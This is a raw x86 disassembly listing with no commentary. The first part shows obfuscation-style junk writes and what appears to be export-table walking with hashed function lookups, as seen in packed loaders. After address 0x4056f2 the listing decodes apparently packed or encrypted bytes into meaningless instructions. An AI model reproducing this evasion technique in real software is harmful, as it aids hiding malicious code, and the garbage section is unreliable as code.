  40544e:	or     DWORD PTR ds:0x42a004,0x7d41
  405458:	xor    ecx,ebx
  40545a:	sbb    DWORD PTR ds:0x42c004,0x1a4b
  405464:	add    ecx,eax
  405466:	cmp    esi,ecx
  405468:	mov    DWORD PTR ds:0x429018,0x444d
  405472:	jne    0x4056b8
  405478:	and    DWORD PTR ds:0x42b004,0x273e
  405482:	push   DWORD PTR [ebp+0x8]
  405485:	add    DWORD PTR ds:0x42d01c,0x42c004
  40548f:	call   0x404fa3
  405494:	mov    DWORD PTR [ebp-0x18],eax
  405497:	sub    ecx,ecx
  405499:	mov    eax,DWORD PTR [ebp-0x4]
  40549c:	and    DWORD PTR ds:0x42d010,0x0
  4054a6:	jmp    0x4054b8
  4054ab:	mov    edi,DWORD PTR ds:0x42d010
  4054b1:	inc    edi
  4054b2:	mov    DWORD PTR ds:0x42d010,edi
  4054b8:	cmp    DWORD PTR ds:0x42d010,0x1b
  4054bf:	jae    0x40557c
  4054c5:	cmp    DWORD PTR ds:0x42d010,0x10
  4054cc:	jne    0x4054d8
  4054d2:	call   DWORD PTR ds:0x42ed55
  4054d8:	cmp    DWORD PTR ds:0x42d010,0xf
  4054df:	jne    0x4054f2
  4054e5:	mov    edi,DWORD PTR ds:0x42d010
  4054eb:	inc    edi
  4054ec:	mov    DWORD PTR ds:0x42d010,edi
  4054f2:	jmp    0x4054ab
  4054f7:	mov    DWORD PTR ds:0x42c00c,0x1c
  405501:	cmp    DWORD PTR ds:0x42c00c,0x0
  405508:	je     0x40557c
  40550e:	cmp    DWORD PTR ds:0x42c00c,0x4
  405515:	jne    0x405544
  40551b:	push   0x213d
  405520:	push   0x2583
  405525:	push   0x42d000
  40552a:	push   0x5f61
  40552f:	push   0x589a
  405534:	push   0x1da2
  405539:	push   0x4b46
  40553e:	call   DWORD PTR ds:0x42ed59
  405544:	cmp    DWORD PTR ds:0x42c00c,0x5
  40554b:	jne    0x40555e
  405551:	mov    edi,DWORD PTR ds:0x42c00c
  405557:	dec    edi
  405558:	mov    DWORD PTR ds:0x42c00c,edi
  40555e:	xor    edi,edi
  405560:	add    edi,DWORD PTR ds:0x42c00c
  405566:	dec    edi
  405567:	mov    DWORD PTR ds:0x42c00c,edi
  40556d:	jmp    0x405501
  405572:	adc    DWORD PTR ds:0x42c004,0x62a8
  40557c:	mov    ecx,DWORD PTR [ebp-0x18]
  40557f:	dec    edi
  405580:	xor    eax,ebx
  405582:	sub    edi,0x56bd
  405588:	mov    edi,0x3272dd
  40558d:	mov    DWORD PTR ds:0x42d00c,0x2303
  405597:	add    eax,edi
  405599:	mov    DWORD PTR ds:0x42a00c,0x3ae7
  4055a3:	cmp    ecx,eax
  4055a5:	mov    DWORD PTR ds:0x42d018,0x39c7
  4055af:	je     0x407aa3
  4055b5:	add    DWORD PTR ds:0x42b004,0x7234
  4055bf:	push   DWORD PTR [ebp-0x18]
  4055c2:	push   DWORD PTR [ebp+0x8]
  4055c5:	call   0x40cc1e
  4055ca:	mov    ecx,DWORD PTR ds:0x42b01c
  4055d0:	sub    DWORD PTR ds:0x42a010,ecx
  4055d6:	mov    DWORD PTR [ebp-0x18],eax
  4055d9:	mov    eax,DWORD PTR [ebp-0x4]
  4055dc:	mov    ecx,DWORD PTR [ebp-0x18]
  4055df:	mov    DWORD PTR ds:0x429000,0x7fe2
  4055e9:	xor    eax,ebx
  4055eb:	or     DWORD PTR ds:0x42a01c,0x42c010
  4055f5:	add    eax,edi
  4055f7:	mov    DWORD PTR ds:0x42b010,0x7af8
  405601:	cmp    ecx,eax
  405603:	mov    DWORD PTR ds:0x429014,0x1a63
  40560d:	je     0x407aa3
  405613:	mov    eax,ds:0x411f6c
  405618:	mov    ecx,DWORD PTR ds:0x411f84
  40561e:	sub    eax,ecx
  405620:	sub    eax,DWORD PTR [eax+ecx*1]
  405623:	mov    eax,DWORD PTR [ebp-0x18]
  405626:	mov    eax,DWORD PTR [eax+0x18]
  405629:	mov    DWORD PTR [ebp-0x24],eax
  40562c:	and    DWORD PTR ds:0x429028,edi
  405632:	mov    eax,DWORD PTR [ebp-0x18]
  405635:	and    DWORD PTR ds:0x429014,0x0
  40563f:	xor    ecx,ecx
  405641:	xor    ecx,DWORD PTR ds:0x429014
  405647:	inc    ecx
  405648:	mov    DWORD PTR ds:0x429014,ecx
  40564e:	cmp    DWORD PTR ds:0x429014,0xa
  405655:	jne    0x405669
  40565b:	push   DWORD PTR [ebp-0xc]
  40565e:	push   0x42e0a1
  405663:	call   DWORD PTR ds:0x42ed5d
  405669:	cmp    DWORD PTR ds:0x429014,0x9
  405670:	jne    0x405683
  405676:	mov    ecx,DWORD PTR ds:0x429014
  40567c:	inc    ecx
  40567d:	mov    DWORD PTR ds:0x429014,ecx
  405683:	cmp    DWORD PTR ds:0x429014,0x1c
  40568a:	jb     0x40563f
  405690:	mov    ecx,DWORD PTR [ebp+0x8]
  405693:	add    ecx,DWORD PTR [eax+0x20]
  405696:	mov    DWORD PTR [ebp-0x2c],ecx
  405699:	mov    eax,DWORD PTR [ebp-0x18]
  40569c:	mov    ecx,DWORD PTR [ebp+0x8]
  40569f:	add    ecx,DWORD PTR [eax+0x24]
  4056a2:	mov    DWORD PTR [ebp-0x34],ecx
  4056a5:	mov    eax,DWORD PTR [ebp-0x18]
  4056a8:	mov    ecx,DWORD PTR [ebp+0x8]
  4056ab:	add    ecx,DWORD PTR [eax+0x1c]
  4056ae:	mov    eax,edi
  4056b0:	mov    DWORD PTR [ebp-0x18],ecx
  4056b3:	jmp    0x407a6b
  4056b8:	mov    ecx,DWORD PTR [ebp-0x2c]
  4056bb:	mov    edx,DWORD PTR [ebp+0x8]
  4056be:	add    edx,DWORD PTR [ecx+esi*4]
  4056c1:	mov    DWORD PTR [ebp-0x28],edx
  4056c4:	mov    ecx,DWORD PTR [ebp-0x4]
  4056c7:	mov    edx,DWORD PTR [ebp-0x28]
  4056ca:	xor    ecx,ebx
  4056cc:	add    ecx,eax
  4056ce:	cmp    edx,ecx
  4056d0:	je     0x407a6b
  4056d6:	jmp    0x407a57
  4056db:	mov    ecx,DWORD PTR [ebp-0x4]
  4056de:	mov    edx,DWORD PTR [ebp-0x8]
  4056e1:	xor    ecx,ebx
  4056e3:	add    ecx,eax
  4056e5:	cmp    edx,ecx
  4056e7:	je     0x407aaf
  4056ed:	jmp    0x407a45
  4056f2:	or     al,0xd7
  4056f4:	xchg   ebp,eax
  4056f5:	loop   0x40576c
  4056f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056f8:	emms   
  4056fa:	adc    dl,BYTE PTR ds:0xbad0f58a
  405700:	push   edx
  405701:	pop    ds
  405702:	xlat   BYTE PTR ds:[ebx]
  405703:	pop    edi
  405704:	jp     0x405780
  405706:	aaa    
  405707:	pop    edi
  405708:	jp     0x405784
  40570a:	xor    eax,edx
  40570c:	in     eax,dx
  40570d:	ins    BYTE PTR es:[edi],dx
  40570e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40570f:	popa   
  405710:	pop    eax
  405711:	xchg   edx,eax
  405712:	data16 fld TBYTE PTR [ecx]
  405715:	push   0x7b
  405717:	push   ecx
  405718:	cmp    bl,ch
  40571a:	inc    ebx
  40571b:	xchg   ebx,eax
  40571c:	mov    fs,WORD PTR [eax+0x35]
  40571f:	imul   DWORD PTR [edi+edx*8]
  405722:	push   cs
  405723:	jns    0x40577a
  405725:	dec    edi
  405726:	push   ecx
  405727:	out    0xf,eax
  405729:	iret   
  40572a:	enter  0xaa99,0xbc
  40572e:	dec    esp
  40572f:	retf   0x401d
  405732:	in     eax,dx
  405733:	jle    0x40575d
  405735:	jae    0x40578d
  405737:	jae    0x4056d0
  405739:	ret    0xbc0f
  40573c:	or     eax,0x1473a3b7
  405741:	dec    ecx
  405742:	pop    ebx
  405743:	test   eax,0x7a01c5d5
  405748:	cmp    cl,dh
  40574a:	jo     0x4057bf
  40574c:	xchg   ecx,eax
  40574d:	xor    al,0x3f
  40574f:	push   cs
  405750:	mov    ds:0x53e9e14,al
  405755:	pop    ecx
  405756:	push   sp
  405758:	jecxz  0x4057ba
  40575a:	add    al,0x7
  40575c:	outs   dx,BYTE PTR ds:[esi]
  40575d:	push   esp
  40575e:	pop    es
  40575f:	xlat   BYTE PTR ds:[ebx]
  405760:	sub    dh,ch
  405762:	cld    
  405763:	push   edi
  405765:	sbb    al,0xf2
  405767:	addr16 inc esi
  405769:	clc    
  40576a:	scas   al,BYTE PTR es:[edi]
  40576b:	data16 cli 
  40576d:	and    dh,BYTE PTR [edi+0x7a]
  405770:	(bad)  
  405771:	lahf   
  405772:	out    0x70,al
  405774:	sub    al,0x9
  405776:	pop    es
  405777:	xlat   BYTE PTR ds:[ebx]
  405778:	xchg   ebp,eax
  405779:	mov    bl,0x44
  40577b:	push   es
  40577c:	outs   dx,BYTE PTR ds:[esi]
  40577d:	sar    BYTE PTR [ebx+esi*2-0x5],0x3e
  405782:	mov    al,0x44
  405784:	jnp    0x4057c8
  405786:	add    al,0xe2
  405788:	jns    0x4057fd
  40578a:	es inc esi
  40578c:	outs   dx,BYTE PTR ds:[esi]
  40578d:	cmp    ch,BYTE PTR [ecx-0x61]
  405790:	repz mov dh,BYTE PTR [ecx+eiz*2]
  405794:	adc    al,0x3b
  405796:	jp     0x40577e
  405798:	int3   
  405799:	(bad)  
  40579a:	(bad)  
  40579b:	hlt    
  40579c:	jo     0x405765
  40579e:	pop    ebx
  40579f:	loopne 0x405786
  4057a1:	shr    BYTE PTR ds:0x6d32f257,0xf6
  4057a8:	xchg   BYTE PTR [edi+eax*8-0x14be1709],dh
  4057af:	int3   
  4057b0:	call   0x45f4fa11
  4057b5:	inc    esp
  4057b7:	fdivr  QWORD PTR [ecx+0x7d]
  4057ba:	xor    eax,0xcf7566fe
  4057bf:	and    ebx,ebx
  4057c1:	cwde   
  4057c2:	ret    
  4057c3:	adc    ecx,esp
  4057c5:	xlat   BYTE PTR ds:[ebx]
  4057c6:	ja     0x405801
  4057c8:	ins    DWORD PTR es:[edi],dx
  4057c9:	inc    esp
  4057ca:	mov    esi,0xd8ef8ef0
  4057cf:	push   eax
  4057d0:	and    BYTE PTR [esi-0x29],bl
  4057d3:	in     eax,dx
  4057d4:	mul    dl
  4057d6:	mov    ch,0x8c
  4057d8:	inc    ebx
  4057d9:	retf   0xbb19
  4057dc:	mov    edx,0x8ffed8f7
  4057e1:	enter  0x9f99,0x96
  4057e5:	nop
  4057e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057e7:	ss pop es
  4057e9:	cmp    eax,0x80078496
  4057ee:	fadd   DWORD PTR [edx]
  4057f0:	in     al,0xae
  4057f2:	xor    al,0x56
  4057f4:	dec    edx
  4057f5:	cwde   
  4057f6:	jp     0x405789
  4057f8:	test   eax,0xcca9322a
  4057fd:	push   ebx
  4057fe:	xor    eax,0xcbac7ef8
  405803:	sahf   
  405804:	mov    esp,0x614c715d
  405809:	mov    dh,0x7b
  40580b:	lods   eax,DWORD PTR ds:[esi]
  40580c:	mov    eax,0xb96dba37
  405811:	loope  0x405846
  405813:	jbe    0x405882
  405815:	mov    bl,0xff
  405817:	adc    ecx,DWORD PTR [eax]
  405819:	jg     0x4057c7
  40581b:	(bad)  
  40581c:	mov    ah,0x72
  40581e:	ret    0xed46
  405821:	mov    ebx,0xaf6d52cb
  405826:	lds    eax,FWORD PTR [ebx+0xd]
  405829:	sub    DWORD PTR [edx],eax
  40582b:	mov    es,ebp
  40582d:	inc    edi
  40582e:	xchg   DWORD PTR [ecx+0x59],ebx
  405831:	cs cs (bad) 
  405834:	fdivr  QWORD PTR [ecx+0x263748d1]
  40583a:	hlt    
  40583b:	and    ecx,DWORD PTR [edx-0x31]
  40583e:	pop    ebx
  40583f:	mov    bh,0xa7
  405841:	out    dx,al
  405842:	push   esi
  405843:	sbb    ecx,DWORD PTR [eax+0x5d]
  405846:	mov    edi,0xff230b63
  40584b:	dec    eax
  40584c:	(bad)  
  40584d:	aam    0xc4
  40584f:	adc    DWORD PTR [ebp*2-0x432de129],eax
  405856:	dec    esp
  405857:	fisttp QWORD PTR [eax+0x54c76ad5]
  40585d:	inc    esp
  40585e:	shr    BYTE PTR [ebx],cl
  405860:	test   eax,0xa6dc97af
  405865:	jnp    0x405809
  405867:	stos   BYTE PTR es:[edi],al
  405868:	add    ecx,DWORD PTR [esi-0x5845d167]
  40586e:	cmc    
  40586f:	pop    ebp
  405870:	add    bh,0xba
  405873:	mov    esi,0x55a8d48
  405878:	retf   0x8073
  40587b:	or     esp,DWORD PTR [ebx+0x2]
  40587e:	nop
  40587f:	push   esp
  405880:	scas   al,BYTE PTR es:[edi]
  405881:	and    esp,DWORD PTR [edx+0x6152a811]
  405887:	ror    DWORD PTR [ecx],cl
  405889:	jmp    0x43f047b1
  40588e:	mov    BYTE PTR [edi+ebx*4-0x59],cl
  405892:	mov    DWORD PTR [edi+eax*1-0x3c84d4b1],eax
  405899:	pop    edi
  40589a:	sub    ebx,DWORD PTR [eax]
  40589c:	rcr    BYTE PTR [ecx],1
  40589e:	fadd   DWORD PTR [edi-0x4184b565]
  4058a4:	cdq    
  4058a5:	mov    ah,0xeb
  4058a7:	vrsqrtss xmm7,xmm1,DWORD PTR [ebx+0x28254b21]
  4058af:	add    BYTE PTR [ebx],ch
  4058b1:	shl    DWORD PTR [ebp-0x33],cl
  4058b4:	ins    WORD PTR es:[edi],dx
  4058b6:	xchg   edx,eax
  4058b7:	push   cs
  4058b8:	ss aaa 
  4058ba:	xor    edi,DWORD PTR [ecx]
  4058bc:	or     cl,bl
  4058be:	popa   
  4058bf:	or     al,0x5e
  4058c1:	sti    
  4058c2:	inc    edi
  4058c3:	push   eax
  4058c4:	mov    esi,0x57bcf62b
  4058c9:	(bad)  
  4058ca:	mov    ch,0x5
  4058cc:	xchg   esi,eax
  4058cd:	xor    BYTE PTR [ebx],ah
  4058cf:	or     dl,BYTE PTR [eax+ebx*2-0x20]
  4058d3:	dec    edi
  4058d4:	pushf  
  4058d5:	gs dec esi
  4058d7:	fiadd  DWORD PTR [ebp+0x13]
  4058da:	scas   al,BYTE PTR es:[edi]
  4058db:	nop
  4058dc:	fmulp  st(6),st
  4058de:	inc    ebx
  4058df:	in     eax,0x6a
  4058e1:	inc    esi
  4058e2:	add    al,0xb5
  4058e4:	pop    ebp
  4058e5:	mov    ds:0xe2feb438,al
  4058ea:	or     DWORD PTR [esp+ecx*2],esp
  4058ed:	push   ecx
  4058ee:	rcr    BYTE PTR [edx],0x6f
  4058f1:	outs   dx,DWORD PTR ds:[esi]
  4058f2:	bsr    ecx,DWORD PTR [edx-0x6c8226ec]
  4058f9:	dec    ebp
  4058fa:	jg     0x4058e4
  4058fc:	scas   eax,DWORD PTR es:[edi]
  4058fd:	ins    BYTE PTR es:[edi],dx
  4058fe:	dec    ebp
  4058ff:	xchg   edx,eax
  405900:	xor    esi,DWORD PTR [eax]
  405902:	lea    eax,[ebp-0x82fd590]
  405908:	xchg   BYTE PTR [eax+0xbcbd498],cl
  40590e:	call   0xe13a:0x34500ab9
  405915:	icebp  
  405916:	push   eax
  405917:	sar    BYTE PTR [edx-0x562560c3],cl
  40591d:	cmc    
  40591e:	xlat   BYTE PTR ds:[ebx]
  40591f:	cwde   
  405920:	add    BYTE PTR [eax+0x66],bh
  405923:	lds    eax,FWORD PTR [ecx+0x58912d55]
  405929:	xchg   edx,eax
  40592a:	(bad)  
  40592b:	lods   eax,DWORD PTR ds:[esi]
  40592c:	push   edx
  40592d:	pop    ss
  40592e:	sub    BYTE PTR [ebx],0x28
  405931:	dec    ebx
  405932:	imul   edx,DWORD PTR [edx+0x3d37325f],0x1e
  405939:	aaa    
  40593a:	jp     0x405938
  40593c:	mov    bl,0x3a
  40593e:	ficom  DWORD PTR [edx+edi*4+0x23]
  405942:	mov    ecx,0x84b7b25b
  405947:	inc    edi
  405948:	in     eax,dx
  405949:	fxch   st(7)
  40594b:	xchg   edi,eax
  40594c:	or     DWORD PTR [esi-0x11dba973],esi
  405952:	mov    DWORD PTR [ebp-0x42fb83e1],ebp
  405958:	outs   dx,BYTE PTR ds:[esi]
  405959:	pop    eax
  40595a:	mov    eax,ds:0xa8ed64bc
  40595f:	sub    esi,DWORD PTR [eax+0x5e95e779]
  405965:	and    al,0x6b
  405967:	adc    BYTE PTR ds:0x16afea3e,dh
  40596d:	xchg   ecx,eax
  40596e:	loop   0x40591d
  405970:	icebp  
  405971:	lods   al,BYTE PTR ds:[esi]
  405972:	es sub ebp,edi
  405975:	and    DWORD PTR [eax],eax
  405977:	bound  eax,QWORD PTR [edi]
  405979:	add    BYTE PTR [ebx+0x53],bh
  40597c:	xchg   ecx,eax
  40597d:	ins    BYTE PTR es:[edi],dx
  40597e:	pop    eax
  40597f:	fdiv   st,st(1)
  405981:	icebp  
  405982:	inc    eax
  405983:	pop    edx
  405984:	aas    
  405985:	sti    
  405986:	sahf   
  405987:	add    al,0x68
  405989:	add    edi,edx
  40598b:	mov    bh,0x30
  40598d:	xchg   edx,eax
  40598e:	dec    eax
  40598f:	push   0x6e
  405991:	and    dh,BYTE PTR [ebx-0x63]
  405994:	popa   
  405995:	mov    ebx,DWORD PTR [esi]
  405997:	enter  0x4bab,0x9f
  40599b:	in     eax,0x64
  40599d:	jns    0x4059dc
  40599f:	popa   
  4059a0:	push   es
  4059a1:	sub    eax,0x799a63fa
  4059a6:	mov    al,0x2c
  4059a8:	and    eax,0x29d418a5
  4059ad:	test   BYTE PTR [ebx-0x3d0ec029],cl
  4059b3:	cmp    BYTE PTR [ecx+0x6a],al
  4059b6:	cmp    al,0x1
  4059b8:	mov    ds:0x74402a6b,eax
  4059bd:	or     eax,0x75cb379e
  4059c2:	lea    ebx,[edi]
  4059c4:	data16 mov dh,0x9a
  4059c7:	or     BYTE PTR [eax-0x20],ch
  4059ca:	xor    esp,ebp
  4059cc:	pusha  
  4059cd:	gs test eax,0xf0d31847
  4059d3:	and    al,0x88
  4059d5:	cmp    eax,ecx
  4059d7:	or     eax,DWORD PTR [edx]
  4059d9:	mov    ch,0xe3
  4059db:	mov    edi,0x20abb067
  4059e0:	cmp    dh,BYTE PTR [edx-0x3e]
  4059e3:	test   cl,bh
  4059e5:	enter  0xc6d0,0x68
  4059e9:	push   esp
  4059ea:	dec    ecx
  4059eb:	mov    edx,0xdac2204b
  4059f0:	cmovle esp,edx
  4059f3:	into   
  4059f4:	dec    ebx
  4059f5:	jo     0x4059f9
  4059f7:	xchg   BYTE PTR [eax],bh
  4059f9:	ins    DWORD PTR es:[edi],dx
  4059fa:	cmovge edx,DWORD PTR [ecx-0x2acb804a]
  405a01:	sub    DWORD PTR [ecx+0x17],edx
  405a04:	xor    DWORD PTR [ebx],ebp
  405a06:	ret    
  405a07:	sahf   
  405a08:	push   esi
  405a09:	mov    dl,0x9
  405a0b:	mov    ch,0x38
  405a0d:	in     al,dx
  405a0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a0f:	andps  xmm0,xmm7
  405a12:	push   es
  405a13:	xchg   esi,eax
  405a14:	scas   eax,DWORD PTR es:[edi]
  405a15:	add    edi,esp
  405a17:	daa    
  405a18:	cld    
  405a19:	ins    BYTE PTR es:[edi],dx
  405a1a:	aas    
  405a1b:	call   0x9f54:0xd5d18b59
  405a22:	loop   0x4059d8
  405a24:	es es ds add eax,0x4775802f
  405a2c:	(bad)  
  405a2d:	pop    ecx
  405a2e:	in     eax,dx
  405a2f:	add    BYTE PTR [edx+esi*8+0x432153d4],ah
  405a36:	xor    ecx,DWORD PTR [esi+0x364d182f]
  405a3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a3d:	inc    ecx
  405a3e:	xchg   ecx,eax
  405a3f:	leave  
  405a40:	xor    BYTE PTR [eax-0x6],al
  405a43:	cwde   
  405a44:	(bad)  
  405a45:	ins    BYTE PTR es:[edi],dx
  405a46:	test   al,0x43
  405a48:	and    eax,0x5decb02c
  405a4d:	fisttp DWORD PTR ds:0x3ca20af9
  405a53:	jnp    0x405a62
  405a55:	dec    esp
  405a56:	inc    edi
  405a57:	mov    edx,0x659aaf1c
  405a5c:	mov    dh,0x30
  405a5e:	(bad)  
  405a5f:	fmul   DWORD PTR [ebp*2+0x3bc6a642]
  405a66:	(bad)  
  405a67:	clc    
  405a68:	pop    ss
  405a69:	das    
  405a6a:	sti    
  405a6b:	push   ds
  405a6c:	mov    ds:0xc76981f2,eax
  405a71:	mov    DWORD PTR [ebx-0x80],edx
  405a74:	gs and al,0x67
  405a77:	mov    edx,0xd7365fa
  405a7c:	das    
  405a7d:	xchg   ebx,eax
  405a7e:	arpl   dx,cx
  405a80:	add    al,0x92
  405a82:	mov    eax,0x7c231e8d
  405a87:	adc    dh,BYTE PTR [eax]
  405a89:	xor    ah,BYTE PTR [edi]
  405a8b:	(bad)  
  405a8c:	(bad)  
  405a8d:	out    dx,eax
  405a8e:	add    bl,BYTE PTR [ebx-0x24]
  405a91:	xor    BYTE PTR ds:0xd5de5f20,bl
  405a97:	mov    BYTE PTR ds:0x477c76da,bh
  405a9d:	cs sbb al,0x6b
  405aa0:	add    eax,0xb1e6fe43
  405aa5:	retf   
  405aa6:	inc    esi
  405aa7:	stos   BYTE PTR es:[edi],al
  405aa8:	jle    0x405a4a
  405aaa:	mov    ch,0x25
  405aac:	mov    bl,BYTE PTR [edi+0x17ea322c]
  405ab2:	sbb    dl,BYTE PTR [edi+0xd]
  405ab5:	rol    BYTE PTR [eax-0x71621e09],1
  405abb:	(bad)  
  405abd:	fcomp  QWORD PTR ds:0x3a8580f1
  405ac3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ac4:	out    dx,al
  405ac5:	retf   0xbf1a
  405ac8:	or     eax,0xf62a12bc
  405acd:	push   ss
  405ace:	mov    ds:0x541ac969,al
  405ad3:	not    DWORD PTR [edi+edx*1+0x4eee6c91]
  405ada:	imul   esi,DWORD PTR [ebx-0x184c651d],0xffffffb0
  405ae1:	xchg   ebx,eax
  405ae2:	rcr    BYTE PTR [ebx-0x82cb14e],cl
  405ae8:	mov    dh,cl
  405aea:	retf   0x89e5
  405aed:	add    eax,0x2ad5b351
  405af2:	test   al,0xa4
  405af4:	(bad)  
  405af6:	pusha  
  405af7:	(bad)  
  405af8:	test   DWORD PTR [edi+0x5d0317e7],0x264791a2
  405b02:	lods   eax,DWORD PTR ds:[esi]
  405b03:	jge    0x405a9b
  405b05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b06:	fdivr  DWORD PTR [ebx-0x61d024ef]
  405b0c:	data16 (bad) 
  405b0e:	rcr    al,cl
  405b10:	inc    edi
  405b11:	mov    BYTE PTR [edx+0x75c571cd],0x9d
  405b18:	push   cs
  405b19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b1a:	jle    0x405ad1
  405b1c:	jge    0x405b64
  405b1e:	push   ebx
  405b1f:	scas   al,BYTE PTR es:[edi]
  405b20:	idiv   DWORD PTR [ecx-0x3]
  405b23:	loope  0x405ba3
  405b25:	cmp    DWORD PTR [esi+esi*4],esp
  405b28:	jae    0x405b10
  405b2a:	add    eax,0xdcfdd5d5
  405b2f:	out    dx,eax
  405b30:	sahf   
  405b31:	push   edx
  405b32:	mov    esi,0xb3ebf55b
  405b37:	xor    al,0xf2
  405b39:	sbb    ecx,DWORD PTR [eax]
  405b3b:	xlat   BYTE PTR ds:[ebx]
  405b3c:	not    DWORD PTR [eax-0x43]
  405b3f:	push   esi
  405b40:	and    eax,0xf2d00603
  405b45:	dec    ecx
  405b46:	xchg   esi,eax
  405b47:	mov    ds:0xacb0c33f,al
  405b4c:	in     eax,0x87
  405b4e:	inc    eax
  405b4f:	jecxz  0x405bb6
  405b51:	rcl    DWORD PTR [ebp-0x36667e0d],0xd2
  405b58:	sbb    BYTE PTR [esi-0x18624bf7],0x22
  405b5f:	test   al,0x8e
  405b61:	arpl   WORD PTR [edi-0x77],dx
  405b64:	mov    eax,0x26136b90
  405b69:	xchg   esi,eax
  405b6a:	inc    ebp
  405b6b:	jno    0x405bb5
  405b6d:	inc    ebx
  405b6e:	dec    esi
  405b70:	leave  
  405b71:	hlt    
  405b72:	pmaxub mm5,QWORD PTR [ebx-0x3f]
  405b76:	in     eax,0x2c
  405b78:	cli    
  405b79:	mov    edx,0xe387fedb
  405b7e:	jge    0x405b75
  405b80:	dec    esp
  405b81:	aas    
  405b82:	sbb    BYTE PTR [eax+0x7a29e40f],dl
  405b88:	int    0xd3
  405b8a:	(bad)  
  405b8b:	pop    ebx
  405b8c:	ins    DWORD PTR es:[edi],dx
  405b8d:	push   ss
  405b8e:	pusha  
  405b8f:	push   eax
  405b90:	imul   eax,DWORD PTR [eax],0xffffff94
  405b93:	lods   eax,DWORD PTR ds:[esi]
  405b94:	mov    gs,WORD PTR [esi]
  405b96:	and    DWORD PTR [esi],ebx
  405b98:	xchg   esp,eax
  405b99:	popa   
  405b9a:	test   BYTE PTR [eax],cl
  405b9c:	xor    ebx,DWORD PTR [ebp+esi*4-0x52e0235c]
  405ba3:	mov    al,0xc1
  405ba5:	lahf   
  405ba6:	adc    al,0x93
  405ba8:	jo     0x405b62
  405baa:	sub    al,ah
  405bac:	(bad)  
  405bad:	xlat   BYTE PTR ds:[ebx]
  405bae:	cmp    DWORD PTR [esi-0x598fd2e9],esp
  405bb4:	sbb    eax,0xc7eaf0aa
  405bb9:	clc    
  405bba:	or     al,0xb3
  405bbc:	(bad)  
  405bbd:	fild   DWORD PTR [ebp+0x53]
  405bc0:	inc    eax
  405bc1:	and    bh,BYTE PTR [ebx-0xb]
  405bc4:	and    eax,0x80ff654d
  405bc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405bca:	xchg   edi,eax
  405bcb:	jl     0x405bce
  405bcd:	and    ch,ah
  405bcf:	cld    
  405bd0:	sub    dh,al
  405bd2:	fcomi  st,st(3)
  405bd4:	push   edx
  405bd5:	lds    eax,FWORD PTR fs:[edx+0x2d]
  405bd9:	push   0xffffffc1
  405bdb:	xchg   BYTE PTR [ebx],ch
  405bdd:	nop
  405bde:	sar    BYTE PTR ss:[esi+0x6c],1
  405be2:	mov    cl,0x8c
  405be4:	scas   al,BYTE PTR es:[edi]
  405be5:	mov    al,ds:0x825c563f
  405bea:	enter  0x453,0xba
  405bee:	pop    ebx
  405bef:	outs   dx,DWORD PTR ds:[esi]
  405bf0:	add    eax,0x4e67b0e2
  405bf5:	icebp  
  405bf6:	(bad)
  405bf9:	stos   DWORD PTR es:[edi],eax
  405bfa:	icebp  
  405bfb:	mov    cl,0x92
  405bfd:	popa   
  405bfe:	in     al,0x33
  405c00:	stos   DWORD PTR es:[edi],eax
  405c01:	push   esi
  405c02:	push   cs
  405c03:	sub    eax,0x1e21ad7c
  405c08:	iret   
  405c09:	jp     0x405c55
  405c0b:	(bad)  
  405c0c:	out    dx,al
  405c0d:	and    BYTE PTR [ebp+0x63],cl
  405c10:	adc    DWORD PTR [ecx+0x2c],esi
  405c13:	les    edx,FWORD PTR [edx]
  405c15:	and    al,0x41
  405c17:	xor    DWORD PTR gs:[ecx+esi*8],esi
  405c1b:	ins    BYTE PTR es:[edi],dx
  405c1c:	(bad)
  405c1f:	and    al,0x3d
  405c21:	std    
  405c22:	mov    cl,0xe
  405c24:	pop    esi
  405c25:	sbb    BYTE PTR [esi],0x39
  405c28:	jp     0x405c61
  405c2a:	loopne 0x405bc9
  405c2c:	call   0xd77be4d5
  405c31:	sbb    eax,0x43822988
  405c36:	xchg   edi,eax
  405c37:	es ds pop ecx
  405c3a:	ror    BYTE PTR [esi-0x1a],1
  405c3d:	xor    BYTE PTR [ecx-0x640d170d],ch
  405c43:	(bad)
  405c46:	dec    esi
  405c47:	inc    ecx
  405c48:	pop    es
  405c49:	xlat   BYTE PTR ds:[ebx]
  405c4a:	inc    ebp
  405c4b:	(bad)  
  405c4c:	mov    esi,0xa2cb3bee
  405c51:	sahf   
  405c52:	xor    ah,BYTE PTR [ecx]
  405c54:	scas   eax,DWORD PTR es:[edi]
  405c55:	loopne 0x405c4f
  405c57:	loop   0x405c8a
  405c59:	lock or ebx,DWORD PTR cs:[ecx]
  405c5d:	xlat   BYTE PTR ds:[ebx]
  405c5e:	test   eax,0xfacecdb4
  405c63:	fild   DWORD PTR [esi+edx*8]
  405c66:	push   0xfffffff5
  405c68:	dec    ebp
  405c69:	clc    
  405c6a:	inc    esp
  405c6b:	mov    cl,0xea
  405c6d:	es cmp cl,bl
  405c70:	rol    BYTE PTR [ebp-0x4e],1
  405c73:	sar    BYTE PTR gs:[edi],1
  405c76:	into   
  405c77:	mov    BYTE PTR [ebx],al
  405c79:	inc    eax
  405c7a:	mov    ebx,0xaf936cf9
  405c7f:	out    0x5b,eax
  405c81:	das    
  405c82:	add    BYTE PTR [esi],bh
  405c84:	outs   dx,BYTE PTR ds:[esi]
  405c85:	cwde   
  405c86:	dec    eax
  405c87:	int3   
  405c88:	pushf  
  405c89:	scas   al,BYTE PTR es:[edi]
  405c8a:	or     BYTE PTR ds:[esi-0x50],al
  405c8e:	idiv   dh
  405c90:	jle    0x405c6d
  405c92:	jl     0x405c23
  405c94:	clc    
  405c95:	lea    edx,[edx+0x582c032d]
  405c9b:	xchg   esi,eax
  405c9c:	inc    ecx
  405c9d:	push   es
  405c9e:	xchg   ecx,eax
  405c9f:	mov    bl,0xd5
  405ca1:	adc    cl,bl
  405ca3:	xor    al,dh
  405ca5:	cmp    ebx,ecx
  405ca7:	adc    BYTE PTR [ecx-0x6fe4179f],al
  405cad:	add    BYTE PTR [edi-0x312e0730],dl
  405cb3:	lock fwait
  405cb5:	xor    BYTE PTR [edx],dl
